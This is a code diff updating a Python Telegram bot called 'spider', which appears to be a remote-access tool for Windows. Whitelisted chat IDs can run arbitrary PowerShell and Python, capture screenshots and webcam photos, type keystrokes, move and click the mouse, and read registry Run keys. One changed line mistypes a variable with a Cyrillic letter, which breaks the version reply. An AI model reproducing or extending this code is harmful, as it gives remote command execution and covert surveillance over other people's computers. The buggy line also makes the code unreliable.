@@ -1,6 +1,6 @@
 isAccess = False
-version = "spider_1.5"
-corect_id = [1205857033,2059209867]
+version = "spider_1.5.1"
+corect_id = [1205857033]
 end = ""
 search_sys = "https://www.google.com/search?q="
 os.system('chcp 65001')
@@ -13,16 +13,15 @@ def check_internet_connection():
     except telebot.apihelper.ApiTelegramException:
         pass
 if check_internet_connection():
-    def sravn(who):
-        global isAccess
-        for a in corect_id:
-            if a == who:
-                return True
-                print(1243)
-            return False
+   def sravn(who):
+    global corect_id
+    if who in corect_id:
+        return True
+    else:
+        return False
 @bot.message_handler(func=lambda m: True,content_types=["text"])
 def echo_all(message):
-    global end,file_otpr,file_otpr_dir,search_sys
+    global end,file_otpr,file_otpr_dir,search_sys,version
     try:
         end = ""
         basic_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
@@ -136,20 +135,19 @@ def echo_all(message):
             elif "num" == b:
                 bot.send_message(message.chat.id, "NUMBERS MODE", reply_markup=num_keyboard)
             elif "cmd " in b:
-                bot.send_message(message.chat.id, "|SPIDER| - PYTHON COMMAND\n``` " + b.split("cmd")[1][1:] + " ```",parse_mode="Markdown")
-                end = os.popen("powershell.exe "+b.split("cmd")[1][1:]).read()
+                bot.send_message(message.chat.id, "|SPIDER| - Windows PowerShell COMMAND:\n``` " + b.split("cmd",1)[1][1:] + " ```",parse_mode="Markdown")
+                end = os.popen("powershell.exe "+b.split("cmd",1)[1][1:]).read()
             elif "pye " in b:
-                bot.send_message(message.chat.id, "|SPIDER| - PYTHON COMMAND\n``` " + b.split("py")[1][1:] + " ```",parse_mode="Markdown")
-                exec(b.split("py")[1][1:])
+                bot.send_message(message.chat.id, "|SPIDER| - Python COMMAND\n``` " + b.split("py",1)[1][1:] + " ```",parse_mode="Markdown")
+                exec(b.split("py",1)[1][1:])
+            elif "powershell"==b:
+              bot.send_message(message.chat.id,'powershell.exe Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)')
+              bot.send_message(message.chat.id,'Stop-Process -Name "имя_процесса" -Force')
             elif "CHECK CONNECTION" == b or "/check" == b:
                 mac = ":".join(['{:02X}'.format((uuid.getnode() >> elements) & 0xFF) for elements in range(5, -1, -1)])
                 end = f"Hello {message.from_user.username}, your device is {mac}\!"
             elif "version"==b:
-                end = version
-            elif "powershell"==b:
-              bot.send_message(message.chat.id,'powershell.exe Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)')
-              bot.send_message(message.chat.id,'Stop-Process -Name "имя_процесса" -Force')
-  
+                уnd = f"YOUR VERSION:{version}"
             elif "regdir"in b:
                 def get_run_keys():
                     try:
@@ -314,7 +312,7 @@ def echo_all(message):
                 img_byte_arr = io.BytesIO()
                 screenshot.save(img_byte_arr, format='PNG')
                 img_byte_arr.seek(0)
-                end = "YOUR SCREENSHOT WITH CURSOR↑"
+                end = f"YOUR SCREENSHOT WITH CURSOR↑\nPOS: {mouse.get_position()}"
                 bot.send_photo(message.chat.id, img_byte_arr)
             elif "photo"==b:
                 cap = cv2.VideoCapture(0)
@@ -336,7 +334,7 @@ def echo_all(message):
                 keyboard.send(b.split("hotkey")[1][1:])
                 end = "|SPIDER| - BUTTON PRESSING\n" + b.split("hotkey")[1][1:]
             elif "write" in b:
-                keyboard.write(b.split("write")[1][1:])
+                kb.write(b.split("write")[1][1:])
                 end="|SPIDER| - WRITING TEXT\n"+b.split("write")[1][1:]
             elif "lclick" in b:
                 [mouse.click("left") for _ in range(int(b.split("lclick")[1][1:]))]
@@ -487,3 +485,4 @@ def handle_document(message):
 def exit_bot():
     if stop==False:bot.polling(none_stop=True)
 exit_bot()
+
